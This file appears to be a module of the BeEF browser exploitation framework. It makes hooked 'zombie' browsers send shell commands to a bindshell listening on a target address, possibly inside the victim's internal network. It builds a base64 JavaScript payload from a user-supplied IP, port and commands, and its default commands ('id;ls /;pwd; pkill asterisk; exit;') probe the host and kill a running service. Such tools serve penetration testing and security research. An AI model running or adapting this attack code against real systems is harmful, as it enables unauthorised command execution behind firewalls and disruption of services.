<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<script>
	var rtnval = "OK Clicked";

	Element.Methods.construct_code = function() {

		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';

		var temp_cmds = document.myform.cmd_str.value;
		temp_cmds = temp_cmds.replace(/\n/g, "\\n")

		// replace sections of the code with user input
		b64code = b64replace(b64code, "IP_ADDRESS", document.myform.ip_str.value);
		b64code = b64replace(b64code, "PORT", document.myform.port_str.value);
		b64code = b64replace(b64code, "COMMAND", temp_cmds);

		// send the code to the zombies
		do_send(b64code);
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<!-- PAGE CONTENT -->
<div id="module_header">Bindshell (Inter-protocol Communication)</div>

<div class="entry">
	Using <a href=http://www.bindshell.net/papers/ipc>Inter-protocol Communication</a> the 
	zombie browser will send commands to a listening bindshell. The target address can be
	on the zombie's subnet which is potentially not directly accessible from the Internet.
 </div>
 
<div id="module_subsection">
	<form name="myform">
		<div id="module_subsection_header">Target Address</div>
		<input type="text" name="ip_str" value="localhost"/>
		<div id="module_subsection_header">Port</div>
		<input type="text" name="port_str" value="4444"/>
		<div id="module_subsection_header">Commands</div>
		note: the semicolons and exit command are required
		<textarea name="cmd_str" rows="5" cols="80">id;ls /;pwd;
pkill asterisk;
exit;
</textarea>
		<input class="button" type="button" value=" Send Now " onClick="javascript:construct_code()"/>
	</form>
</div>




